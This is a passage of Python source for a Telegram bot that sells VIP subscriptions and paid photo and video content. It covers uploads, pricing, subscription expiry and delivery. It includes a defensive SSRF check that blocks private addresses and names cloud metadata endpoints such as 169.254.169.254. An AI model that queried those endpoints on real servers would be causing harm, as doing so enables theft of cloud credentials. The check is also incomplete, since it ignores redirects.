deleted_count > 0\n\ndef add_teaser(file_path, file_type, description, vip_only=False):\n    \"\"\"Add a teaser to the database\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n        INSERT INTO teasers (file_path, file_type, description, created_date, vip_only)\n        VALUES (?, ?, ?, ?, ?)\n    ''', (file_path, file_type, description, datetime.datetime.now().isoformat(), 1 if vip_only else 0))\n    conn.commit()\n    conn.close()\n\ndef start_vip_upload_session(chat_id, user_id):\n    \"\"\"Start guided VIP content upload session\"\"\"\n    if user_id != OWNER_ID:\n        bot.send_message(chat_id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    # Initialize VIP upload session\n    upload_sessions[OWNERS[0]] = {\n        'type': 'vip_content',\n        'step': 'waiting_for_file',\n        'content_type': 'vip',\n        'name': None,\n        'price': None,\n        'description': None,\n        'file_path': None,\n        'file_type': None\n    }\n    \n    upload_text = \"\"\"\n💎 <b>VIP CONTENT UPLOAD</b> 💎\n\n📤 <b>Step 1: Upload File</b>\nSend me the file you want to add as VIP content:\n\n📱 <b>Supported Files:</b>\n• Photos (JPG, PNG, etc.)\n• Videos (MP4)\n• Animated GIFs\n\n🎯 <b>Tips:</b>\n• Upload high-quality visual content only\n• VIP members get FREE access\n• Non-VIP users need subscription\n\n📂 Just send the photo/video when ready!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel VIP Upload\", callback_data=\"cancel_vip_upload\"))\n    \n    bot.send_message(chat_id, upload_text, reply_markup=markup, parse_mode='HTML')\n\ndef handle_vip_file_upload(message, file_id, file_type):\n    \"\"\"Handle VIP content file upload\"\"\"\n    logger.info(f\"VIP content handler called - Content type: {message.content_type}, File type: {file_type}\")\n    session = upload_sessions[OWNERS[0]]\n    \n    # Store file information\n    session['file_path'] = file_id\n    session['file_type'] = file_type\n    session['step'] = 'waiting_for_name'\n    \n    # Extract filename for smart default based on detected file type\n    filename = \"custom_content\"\n    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')\n    \n    if file_type.lower() == \"photo\":\n        filename = f\"vip_photo_{timestamp}\"\n    elif file_type.lower() == \"video\":\n        filename = f\"vip_video_{timestamp}\"\n    elif file_type.lower() == \"gif\":\n        filename = f\"vip_gif_{timestamp}\"\n    # Documents not supported for VIP content\n    \n    # Try to extract original filename for better defaults\n    if message.content_type == 'video' and hasattr(message.video, 'file_name') and message.video.file_name:\n        filename = message.video.file_name.split('.')[0]\n    # Document handling removed for VIP content\n    \n    # Clean filename (replace spaces with underscores, keep alphanumeric)\n    safe_filename = ''.join(c if c.isalnum() or c == '_' else '_' for c in filename.lower())\n    session['suggested_name'] = safe_filename\n    \n    # Ask for content name\n    name_text = f\"\"\"\n✅ <b>{file_type.title()} uploaded successfully!</b>\n\n📝 <b>Step 2: Content Name</b>\nChoose a unique name for this VIP content:\n\n💡 <b>Suggested:</b> <code>{safe_filename}</code>\n\n🔤 <b>Naming Rules:</b>\n• Use letters, numbers, and underscores only\n• No spaces allowed\n• Must be unique\n\n✍️ Type your custom name or use the buttons below:\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(f\"✅ Use: {safe_filename}\", callback_data=\"use_suggested_name\"))\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel Upload\", callback_data=\"cancel_vip_upload\"))\n    \n    bot.send_message(message.chat.id, name_text, reply_markup=markup, parse_mode='HTML')\n\ndef handle_vip_name_input(message):\n    \"\"\"Handle VIP content name input\"\"\"\n    session = upload_sessions[OWNERS[0]]\n    name = message.text.strip()\n    \n    # Validate name\n    if not name or ' ' in name or not all(c.isalnum() or c == '_' for c in name):\n        bot.send_message(message.chat.id, \"❌ Invalid name! Use only letters, numbers, and underscores (no spaces).\\nExample: my_vip_content_1\")\n        return\n    \n    # Check if name already exists\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT name FROM content_items WHERE name = ?', (name,))\n    existing = cursor.fetchone()\n    conn.close()\n    \n    if existing:\n        bot.send_message(message.chat.id, f\"❌ Content with name '{name}' already exists! Choose a different name.\")\n        return\n    \n    # Store name and move to description step\n    session['name'] = name\n    session['step'] = 'waiting_for_description'\n    \n    desc_text = f\"\"\"\n✅ <b>Name set:</b> {name}\n\n📝 <b>Step 3: Description (Optional)</b>\nAdd a description that VIP members will see:\n\n💡 <b>Examples:</b>\n• \"Exclusive behind-the-scenes content\"\n• \"Special VIP-only photo set\"\n• \"Premium video content for VIPs\"\n\n✍️ Type your description or skip to use a default:\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(\"⏭️ Skip Description\", callback_data=\"skip_vip_description\"))\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel Upload\", callback_data=\"cancel_vip_upload\"))\n    \n    bot.send_message(message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')\n\ndef handle_vip_description_input(message):\n    \"\"\"Handle VIP content description input\"\"\"\n    session = upload_sessions[OWNERS[0]]\n    description = message.text.strip()\n    \n    if description.lower() == 'skip':\n        description = f\"Exclusive VIP {session.get('file_type', 'content').lower()}\"\n    \n    session['description'] = description\n    \n    # Set VIP price (VIP content is free for VIP members, but has nominal price for display)\n    session['price'] = 0  # VIP content is free for VIP members\n    \n    # Save VIP content\n    save_uploaded_content(session)\n\ndef handle_vip_settings_input(message):\n    \"\"\"Handle VIP settings input from interactive buttons\"\"\"\n    # Security check: Only owner can modify VIP settings\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only feature.\")\n        return\n    \n    # Robustness check: Ensure session exists and is valid\n    if OWNERS[0] not in upload_sessions:\n        bot.send_message(message.chat.id, \"❌ No active VIP settings session. Please start from VIP Settings.\")\n        return\n    \n    session = upload_sessions[OWNERS[0]]\n    \n    # Validate session type\n    if session.get('type') != 'vip_settings':\n        bot.send_message(message.chat.id, \"❌ Invalid session type. Please start from VIP Settings.\")\n        return\n        \n    setting = session.get('setting')\n    if not setting:\n        bot.send_message(message.chat.id, \"❌ Invalid settings session. Please start from VIP Settings.\")\n        return\n    \n    user_input = message.text.strip()\n    \n    try:\n        if setting == 'price':\n            # Handle VIP price input\n            try:\n                price = int(user_input)\n                if price <= 0 or price > 150000:\n                    bot.send_message(message.chat.id, \"❌ Price must be between 1 and 150,000 Stars! Please try again:\")\n                    return\n                \n                # Update VIP price setting\n                conn = get_db_connection()\n                cursor = conn.cursor()\n                cursor.execute('INSERT OR REPLACE INTO vip_settings (key, value) VALUES (?, ?)', \n                             ('vip_price_stars', str(price)))\n                conn.commit()\n                conn.close()\n                \n                # Clear session\n                del upload_sessions[OWNERS[0]]\n                \n                success_text = f\"\"\"\n✅ <b>VIP PRICE UPDATED SUCCESSFULLY!</b> ✅\n\n💰 <b>New VIP Price:</b> {price:,} Stars\n💵 <b>Approximate USD:</b> ${price * 0.01:.2f}\n\n🎉 All new VIP subscriptions will now cost {price:,} Stars!\n\"\"\"\n                \n                markup = types.InlineKeyboardMarkup()\n                markup.add(types.InlineKeyboardButton(\"⚙️ VIP Settings\", callback_data=\"vip_settings\"))\n                markup.add(types.InlineKeyboardButton(\"🏠 VIP Dashboard\", callback_data=\"cmd_vip\"))\n                \n                bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')\n                \n            except ValueError:\n                bot.send_message(message.chat.id, \"❌ Invalid price! Please enter a number (e.g., 399, 500, 1000, 5000):\")\n                return\n        \n        elif setting == 'duration':\n            # Handle VIP duration input\n            try:\n                duration = int(user_input)\n                if duration <= 0:\n                    bot.send_message(message.chat.id, \"❌ Duration must be a positive number! Please try again:\")\n                    return\n                \n                # Update VIP duration setting\n                conn = get_db_connection()\n                cursor = conn.cursor()\n                cursor.execute('INSERT OR REPLACE INTO vip_settings (key, value) VALUES (?, ?)', \n                             ('vip_duration_days', str(duration)))\n                conn.commit()\n                conn.close()\n                \n                # Clear session\n                del upload_sessions[OWNERS[0]]\n                \n                # Calculate friendly duration display\n                duration_text = f\"{duration} days\"\n                if duration == 7:\n                    duration_text = \"7 days (1 week)\"\n                elif duration == 30:\n                    duration_text = \"30 days (1 month)\"\n                elif duration == 90:\n                    duration_text = \"90 days (3 months)\"\n                elif duration == 365:\n                    duration_text = \"365 days (1 year)\"\n                \n                success_text = f\"\"\"\n✅ <b>VIP DURATION UPDATED SUCCESSFULLY!</b> ✅\n\n⏰ <b>New VIP Duration:</b> {duration_text}\n\n🎉 All new VIP subscriptions will now last for {duration} days!\n\"\"\"\n                \n                markup = types.InlineKeyboardMarkup()\n                markup.add(types.InlineKeyboardButton(\"⚙️ VIP Settings\", callback_data=\"vip_settings\"))\n                markup.add(types.InlineKeyboardButton(\"🏠 VIP Dashboard\", callback_data=\"cmd_vip\"))\n                \n                bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')\n                \n            except ValueError:\n                bot.send_message(message.chat.id, \"❌ Invalid duration! Please enter a number of days (e.g., 7, 30, 90):\")\n                return\n        \n        elif setting == 'description':\n            # Handle VIP description input\n            if len(user_input) < 5:\n                bot.send_message(message.chat.id, \"❌ Description too short! Please enter at least 5 characters:\")\n                return\n            \n            # Update VIP description setting\n            conn = get_db_connection()\n            cursor = conn.cursor()\n            cursor.execute('INSERT OR REPLACE INTO vip_settings (key, value) VALUES (?, ?)', \n                         ('vip_description', user_input))\n            conn.commit()\n            conn.close()\n            \n            # Clear session\n            del upload_sessions[OWNERS[0]]\n            \n            # Escape HTML special characters to prevent malformed HTML rendering\n            safe_description = user_input.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            \n            success_text = f\"\"\"\n✅ <b>VIP DESCRIPTION UPDATED SUCCESSFULLY!</b> ✅\n\n📝 <b>New VIP Description:</b> \n\"{safe_description}\"\n\n🎉 This description will now appear when users see the VIP upgrade option!\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"⚙️ VIP Settings\", callback_data=\"vip_settings\"))\n            markup.add(types.InlineKeyboardButton(\"🏠 VIP Dashboard\", callback_data=\"cmd_vip\"))\n            \n            bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')\n    \n    except Exception as e:\n        logger.error(f\"Error handling VIP settings input: {e}\")\n        # Clear session on error\n        if OWNERS[0] in upload_sessions:\n            del upload_sessions[OWNERS[0]]\n        bot.send_message(message.chat.id, \"❌ An error occurred while updating the setting. Please try again from VIP Settings.\")\n\ndef complete_vip_upload_with_defaults(session):\n    \"\"\"Complete VIP upload using default values\"\"\"\n    # Use suggested name if no custom name provided\n    if not session.get('name'):\n        session['name'] = session.get('suggested_name', f\"vip_content_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}\")\n    \n    # Use default description if none provided\n    if not session.get('description'):\n        session['description'] = f\"Exclusive VIP {session.get('file_type', 'content').lower()}\"\n    \n    # Set VIP price (free for VIP members)\n    session['price'] = 0\n    \n    # Save VIP content\n    save_uploaded_content(session)\n\n# VIP Content Management Functions\n\ndef get_vip_content_count():\n    \"\"\"Get count of VIP-only content\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT COUNT(*) FROM content_items WHERE content_type = ?', ('vip',))\n    count = cursor.fetchone()[0]\n    conn.close()\n    return count\n\ndef get_vip_content_list():\n    \"\"\"Get all VIP-only content with details\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n        SELECT name, price_stars, file_path, description, created_date\n        FROM content_items \n        WHERE content_type = ? \n        ORDER BY created_date DESC\n    ''', ('vip',))\n    vip_content = cursor.fetchall()\n    conn.close()\n    return vip_content\n\ndef add_vip_content(name, price_stars, file_path, description):\n    \"\"\"Add new VIP-only content\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n        INSERT INTO content_items (name, price_stars, file_path, description, created_date, content_type)\n        VALUES (?, ?, ?, ?, ?, ?)\n    ''', (name, price_stars, file_path, description, datetime.datetime.now().isoformat(), 'vip'))\n    conn.commit()\n    conn.close()\n\ndef update_vip_content(name, price_stars, file_path, description):\n    \"\"\"Update existing VIP content\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n        UPDATE content_items \n        SET price_stars = ?, file_path = ?, description = ?\n        WHERE name = ? AND content_type = ?\n    ''', (price_stars, file_path, description, name, 'vip'))\n    updated_count = cursor.rowcount\n    conn.commit()\n    conn.close()\n    return updated_count > 0\n\ndef delete_vip_content(name):\n    \"\"\"Delete VIP content by name\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('DELETE FROM content_items WHERE name = ? AND content_type = ?', (name, 'vip'))\n    deleted_count = cursor.rowcount\n    conn.commit()\n    conn.close()\n    return deleted_count > 0\n\ndef get_vip_content_by_name(name):\n    \"\"\"Get specific VIP content by name\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('''\n        SELECT name, price_stars, file_path, description, created_date\n        FROM content_items \n        WHERE name = ? AND content_type = ?\n    ''', (name, 'vip'))\n    content = cursor.fetchone()\n    conn.close()\n    return content\n\n# VIP Management Functions\n\ndef check_vip_status(user_id):\n    \"\"\"Check if user has active VIP subscription\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    cursor.execute('''\n        SELECT start_date, expiry_date, is_active \n        FROM vip_subscriptions \n        WHERE user_id = ? AND is_active = 1\n    ''', (user_id,))\n    \n    subscription = cursor.fetchone()\n    conn.close()\n    \n    if not subscription:\n        return {'is_vip': False, 'days_left': 0, 'expired': False}\n    \n    start_date, expiry_date, is_active = subscription\n    \n    # Parse expiry date\n    try:\n        expiry_datetime = datetime.datetime.fromisoformat(expiry_date)\n        now = datetime.datetime.now()\n        \n        if expiry_datetime > now:\n            days_left = (expiry_datetime - now).days\n            return {'is_vip': True, 'days_left': days_left, 'expired': False}\n        else:\n            # Subscription expired, deactivate it\n            deactivate_expired_vip(user_id)\n            return {'is_vip': False, 'days_left': 0, 'expired': True}\n    except:\n        return {'is_vip': False, 'days_left': 0, 'expired': False}\n\ndef deactivate_expired_vip(user_id):\n    \"\"\"Deactivate expired VIP subscription\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('UPDATE vip_subscriptions SET is_active = 0 WHERE user_id = ?', (user_id,))\n    conn.commit()\n    conn.close()\n\ndef get_vip_settings(key):\n    \"\"\"Get VIP setting value\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT value FROM vip_settings WHERE key = ?', (key,))\n    result = cursor.fetchone()\n    conn.close()\n    return result[0] if result else None\n\ndef update_vip_settings(key, value):\n    \"\"\"Update VIP setting\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('INSERT OR REPLACE INTO vip_settings (key, value) VALUES (?, ?)', (key, value))\n    conn.commit()\n    conn.close()\n\ndef activate_vip_subscription(user_id):\n    \"\"\"Activate or renew VIP subscription for user\"\"\"\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    # Get VIP duration from settings\n    duration_days = int(get_vip_settings('vip_duration_days') or 30)\n    \n    now = datetime.datetime.now()\n    \n    # Check if user already has an active subscription\n    cursor.execute('SELECT expiry_date FROM vip_subscriptions WHERE user_id = ? AND is_active = 1', (user_id,))\n    existing = cursor.fetchone()\n    \n    if existing:\n        # Extend existing subscription\n        try:\n            current_expiry = datetime.datetime.fromisoformat(existing[0])\n            # If still active, extend from expiry date, otherwise from now\n            extend_from = max(current_expiry, now)\n        except:\n            extend_from = now\n        \n        new_expiry = extend_from + datetime.timedelta(days=duration_days)\n        \n        cursor.execute('''\n            UPDATE vip_subscriptions \n            SET expiry_date = ?, is_active = 1, total_payments = total_payments + 1\n            WHERE user_id = ?\n        ''', (new_expiry.isoformat(), user_id))\n    else:\n        # Create new subscription\n        expiry_date = now + datetime.timedelta(days=duration_days)\n        \n        cursor.execute('''\n            INSERT OR REPLACE INTO vip_subscriptions \n            (user_id, start_date, expiry_date, is_active, total_payments)\n            VALUES (?, ?, ?, 1, 1)\n        ''', (user_id, now.isoformat(), expiry_date.isoformat()))\n    \n    conn.commit()\n    conn.close()\n    \n    return duration_days\n\ndef deliver_vip_content(chat_id, user_id, content_name):\n    \"\"\"Deliver VIP-only content for free to VIP users\"\"\"\n    # Verify VIP status\n    vip_status = check_vip_status(user_id)\n    if not vip_status['is_vip']:\n        bot.send_message(chat_id, \"❌ VIP membership required! Please upgrade to VIP to access this content for free.\")\n        return\n    \n    # Get content details - ONLY access VIP content type\n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('SELECT file_path, description, content_type FROM content_items WHERE name = ? AND content_type = ?', (content_name, 'vip'))\n    content = cursor.fetchone()\n    conn.close()\n    \n    if not content:\n        bot.send_message(chat_id, f\"❌ VIP content '{content_name}' not found. This content may not be available in the VIP library.\")\n        return\n    \n    file_path, description, content_type = content\n    \n    # Verify this is actually VIP content (double-check)\n    if content_type != 'vip':\n        bot.send_message(chat_id, f\"❌ '{content_name}' is not VIP-exclusive content. This content requires individual purchase.\")\n        return\n    \n    # Send VIP access message\n    vip_message = f\"\"\"\n💎 <b>VIP EXCLUSIVE ACCESS</b> 💎\n\n🎉 Here's your free content as a VIP member!\n\n<b>{content_name}</b>\n{description}\n\n💕 Thank you for being an amazing VIP supporter!\n⏰ Your VIP expires in {vip_status['days_left']} days\n\"\"\"\n    \n    bot.send_message(chat_id, vip_message, parse_mode='HTML')\n    \n    # Send the actual content (same logic as paid content delivery)\n    try:\n        if file_path.startswith('http'):\n            # It's a URL\n            if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):\n                bot.send_photo(chat_id, file_path, caption=f\"💎 VIP: {content_name}\")\n            elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):\n                bot.send_video(chat_id, file_path, caption=f\"💎 VIP: {content_name}\")\n            else:\n                bot.send_document(chat_id, file_path, caption=f\"💎 VIP: {content_name}\")\n        elif len(file_path) > 50 and not file_path.startswith('/'):\n            # It's a Telegram file_id\n            try:\n                bot.send_photo(chat_id, file_path, caption=f\"💎 VIP: {content_name}\")\n            except:\n                try:\n                    bot.send_video(chat_id, file_path, caption=f\"💎 VIP: {content_name}\")\n                except:\n                    try:\n                        bot.send_document(chat_id, file_path, caption=f\"💎 VIP: {content_name}\")\n                    except:\n                        bot.send_message(chat_id, f\"💎 Your VIP content: {content_name}\\n\\nFile ID: {file_path}\\n\\n⚠️ If you have trouble accessing this content, please contact me!\")\n        else:\n            # It's a local file path\n            with open(file_path, 'rb') as file:\n                if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):\n                    bot.send_photo(chat_id, file, caption=f\"💎 VIP: {content_name}\")\n                elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):\n                    bot.send_video(chat_id, file, caption=f\"💎 VIP: {content_name}\")\n                else:\n                    bot.send_document(chat_id, file, caption=f\"💎 VIP: {content_name}\")\n    except Exception as e:\n        bot.send_message(chat_id, f\"💎 Your VIP content: {content_name}\\n\\n⚠️ There was an issue delivering your content. Please contact me and I'll send it manually!\")\n        logger.error(f\"Error sending VIP content {content_name}: {e}\")\n    \n    # Notify owner of VIP content access\n    try:\n        user_data = get_user_data(user_id)\n        if user_data:\n            username = user_data[1] or \"none\"\n            first_name = user_data[2] or \"N/A\"\n            \n            bot.send_message(OWNER_ID, f\"\"\"\n💎 <b>VIP CONTENT ACCESS</b>\n\n👤 VIP Member: {first_name} (@{username})\n🎁 Content: {content_name}\n🆔 User ID: {user_id}\n⏰ VIP expires in {vip_status['days_left']} days\n\"\"\", parse_mode='HTML')\n    except Exception as e:\n        logger.error(f\"Error notifying owner of VIP access: {e}\")\n\ndef validate_url_security(url):\n    \"\"\"\n    Validate URL to prevent SSRF attacks\n    \n    Args:\n        url (str): URL to validate\n        \n    Returns:\n        tuple: (is_safe, error_message)\n    \"\"\"\n    try:\n        parsed = urlparse(url)\n        \n        # Only allow http and https\n        if parsed.scheme.lower() not in ('http', 'https'):\n            return False, \"Only HTTP and HTTPS URLs are allowed\"\n        \n        # Resolve hostname to IP address\n        hostname = parsed.hostname\n        if not hostname:\n            return False, \"Invalid hostname\"\n        \n        # Get IP address\n        ip_str = socket.gethostbyname(hostname)\n        ip = ipaddress.ip_address(ip_str)\n        \n        # Block private, loopback, link-local, and multicast addresses\n        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast:\n            return False, \"Access to internal/private networks is not allowed\"\n        \n        # Block common metadata endpoints\n        if hostname.lower() in ['metadata.google.internal', '169.254.169.254', 'metadata']:\n            return False, \"Access to metadata endpoints is not allowed\"\n        \n        return True, \"\"\n        \n    except socket.gaierror:\n        return False, \"Could not resolve hostname\"\n    except Exception as e:\n        return False, f\"URL validation error: {str(e)}\"\n\ndef download_and_upload_image(url, chat_id=None):\n    \"\"\"\n    Download an image from an external URL and upload it to Telegram to get a permanent file_id.\n    \n    Args:\n        url (str): The external image URL to download\n        chat_id (int): Optional chat ID for progress notifications\n    \n    Returns:\n        tuple: (success, file_id_or_error_message, file_type)\n    \"\"\"\n    try:\n        # Validate URL format\n        parsed_url = urlparse(url)\n        if not parsed_url.scheme or not parsed_url.netloc:\n            return False, \"❌ Invalid URL format\", None\n        \n        # Security validation to prevent SSRF\n        is_safe, security_error = validate_url_security(url)\n        if not is_safe:\n            return False, f\"❌ Security error: {security_error}\", None\n        \n        # Send progress notification if chat_id provided\n        if chat_id:\n            bot.send_message(chat_id, \"⏳ Downloading image from external URL...\", parse_mode='HTML')\n        \n        # Download the image with appropriate headers\n        headers = {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',\n            'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',\n            'Accept-Language': 'en-US,en;q=0.5',\n            'Accept-Encoding': 'gzip, deflate',\n            'DNT': '1',\n            'Connection': 'keep-alive',\n            'Upgrade-Insecure-Requests': '1',\n        }\n        \n        # Download with timeout and size limit\n        response = requests.get(url, headers=headers, timeout=30, stream=True)\n        response.raise_for_status()\n        \n        # Check content type\n        content_type = response.headers.get('content-type', '').lower()\n        if not content_type.startswith('image/'):\n            return False, \"❌ URL does not point to an image file\", None\n        \n        # Check file size (limit to 50MB to stay within Telegram limits)\n        content_length = response.headers.get('content-length')\n        if content_length and int(content_length) > 50 * 1024 * 1024:\n            return False, \"❌ Image file too large (max 50MB)\", None\n        \n        # Determine file extension and type\n        file_extension = None\n        file_type = \"photo\"  # Default to photo\n        \n        if 'jpeg' in content_type or 'jpg' in content_type:\n            file_extension = '.jpg'\n            file_type = \"photo\"\n        elif 'png' in content_type:\n            file_extension = '.png'\n            file_type = \"photo\"\n        elif 'gif' in content_type:\n            file_extension = '.gif'\n            file_type = \"animation\"\n        elif 'webp' in content_type:\n            file_extension = '.webp'\n            file_type = \"photo\"\n        else:\n            # Try to get extension from URL\n            url_path = parsed_url.path.lower()\n            if any(ext in url_path for ext in ['.jpg', '.jpeg']):\n                file_extension = '.jpg'\n                file_type = \"photo\"\n            elif '.png' in url_path:\n                file_extension = '.png'\n                file_type = \"photo\"\n            elif '.gif' in url_path:\n                file_extension = '.gif'\n                file_type = \"animation\"\n            elif '.webp' in url_path:\n                file_extension = '.webp'\n                file_type = \"photo\"\n            else:\n                file_extension = '.jpg'  # Default fallback\n                file_type = \"photo\"\n        \n        # Update progress\n        if chat_id:\n            bot.send_message(chat_id, \"📤 Uploading to Telegram...\", parse_mode='HTML')\n        \n        # Create temporary file and download content\n        with tempfile.NamedTemporaryFile(suffix=file_extension, delete=False) as temp_file:\n            # Download in chunks to handle large files\n            downloaded_size = 0\n            for chunk in response.iter_content(chunk_size=8192):\n                if chunk:\n                    temp_file.write(chunk)\n                    downloaded_size += len(chunk)\n                    # Stop if file gets too large\n                    if downloaded_size > 50 * 1024 * 1024:\n                        temp_file.close()\n                        os.unlink(temp_file.name)\n                        return False, \"❌ Image file too large (max 50MB)\", None\n            \n            temp_file_path = temp_file.name\n        \n        # Upload to Telegram based on file type\n        try:\n            with open(temp_file_path, 'rb') as file:\n                if file_type == \"animation\":\n                    # Upload as animation (GIF)\n                    result = bot.send_animation(OWNER_ID, file)\n                    if result and result.animation:\n                        file_id = result.animation.file_id\n                    else:\n                        raise Exception(\"Failed to get animation file_id from Telegram\")\n                else:\n                    # Upload as photo\n                    result = bot.send_photo(OWNER_ID, file)\n                    if result and result.photo:\n                        file_id = result.photo[-1].file_id  # Get highest resolution\n                    else:\n                        raise Exception(\"Failed to get photo file_id from Telegram\")\n                \n                # Delete the temporary file\n                os.unlink(temp_file_path)\n                \n                # Send success notification\n                if chat_id:\n                    bot.send_message(chat_id, \"✅ Image successfully uploaded to Telegram!\", parse_mode='HTML')\n                \n                logger.info(f\"Successfully converted URL to file_id: {url} -> {file_id}\")\n                return True, file_id, file_type\n                \n        except Exception as upload_error:\n            # Clean up temp file on upload error\n            if os.path.exists(temp_file_path):\n                os.unlink(temp_file_path)\n            logger.error(f\"Error uploading to Telegram: {upload_error}\")\n            return False, f\"❌ Failed to upload to Telegram: {str(upload_error)}\", None\n    \n    except requests.exceptions.Timeout:\n        return False, \"❌ Download timed out. Please try again or use a different URL.\", None\n    except requests.exceptions.ConnectionError:\n        return False, \"❌ Connection error. Please check the URL and try again.\", None\n    except requests.exceptions.HTTPError as e:\n        if e.response.status_code == 403:\n            return False, \"❌ Access forbidden. The image may have hotlink protection.\", None\n        elif e.response.status_code == 404:\n            return False, \"❌ Image not found (404). Please check the URL.\", None\n        else:\n            return False, f\"❌ HTTP error {e.response.status_code}. Please try a different URL.\", None\n    except requests.exceptions.RequestException as e:\n        return False, f\"❌ Download failed: {str(e)}\", None\n    except Exception as e:\n        logger.error(f\"Unexpected error in download_and_upload_image: {e}\")\n        return False, f\"❌ Unexpected error: {str(e)}\", None\n\n# Bot command handlers\n\n@bot.message_handler(commands=['start'])\ndef start_command(message):\n    \"\"\"Handle /start command\"\"\"\n    add_or_update_user(message.from_user)\n    \n    # Check VIP status\n    vip_status = check_vip_status(message.from_user.id)\n    vip_text = \"\"\n    if vip_status['is_vip']:\n        days_left = vip_status['days_left']\n        vip_text = f\"\\n💎 VIP MEMBER (expires in {days_left} days)\\n\"\n    \n    welcome_text = f\"\"\"\n🌟 Welcome to my private paradise only the bold get in here, {message.from_user.first_name}! 🌟\n{vip_text}\nGet ready to dive into me exclusive, unfiltered, and all yours. 🔥\n\n✨ What you can do here:\n• Get FREE teasers and previews\n• Purchase exclusive content with Telegram Stars\n• Access special fan-only content\n\n💫 Quick actions:\n\"\"\"\n    \n    # Create inline keyboard with main menu buttons\n    markup = types.InlineKeyboardMarkup(row_width=1)\n    markup.add(types.InlineKeyboardButton(\"🌟 VIP Portal\", callback_data=\"vip_access\"))\n    markup.add(types.InlineKeyboardButton(\"🎬 Free VIP Teasers\", callback_data=\"teasers\"))\n    markup.add(types.InlineKeyboardButton(\"🛒 Content Showcase\", callback_data=\"browse_content\"))\n    markup.add(types.InlineKeyboardButton(\"ℹ️ Help\", callback_data=\"help\"))\n    \n    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)\n\n@bot.message_handler(commands=['teaser'])\ndef teaser_command(message):\n    \"\"\"Handle /teaser command with VIP-exclusive content\"\"\"\n    add_or_update_user(message.from_user)\n    \n    # Check VIP status\n    vip_status = check_vip_status(message.from_user.id)\n    is_vip = vip_status['is_vip']\n    \n    if is_vip:\n        # Get VIP teasers first, if none exist show regular message\n        vip_teasers = get_vip_teasers()\n        \n        if vip_teasers:\n            # Send VIP teaser (most recent)\n            file_path, file_type, description = vip_teasers[0]\n            \n            # Escape HTML characters in description\n            safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            \n            teaser_text = f\"\"\"\n💎 <b>VIP EXCLUSIVE TEASER</b> 💎\n\n🎉 Special preview content just for my VIP members!\n\n{safe_description}\n\n🌟 <b>VIP Perks Active:</b>\n• Unlimited free access to all content\n• Exclusive VIP-only teasers like this one\n• Direct personal communication priority\n• Monthly bonus content drops\n\n⏰ Your VIP expires in {vip_status['days_left']} days\n\n💕 You're absolutely amazing for being VIP! This exclusive content is made just for you... ✨\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"🎁 Access All VIP Content FREE\", callback_data=\"browse_content\"))\n            markup.add(types.InlineKeyboardButton(\"🎬 VIP Teasers Collection\", callback_data=\"vip_teasers_collection\"))\n            markup.add(types.InlineKeyboardButton(\"🔄 Extend VIP Membership\", callback_data=\"vip_access\"))\n            \n            bot.send_message(message.chat.id, teaser_text, reply_markup=markup, parse_mode='HTML')\n            \n            # Send the actual VIP teaser file\n            try:\n                if file_path.startswith('http'):\n                    # It's a URL\n                    if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):\n                        bot.send_photo(message.chat.id, file_path, caption=f\"💎 VIP Exclusive\")\n                    elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):\n                        bot.send_video(message.chat.id, file_path, caption=f\"💎 VIP Exclusive\")\n                    else:\n                        bot.send_document(message.chat.id, file_path, caption=f\"💎 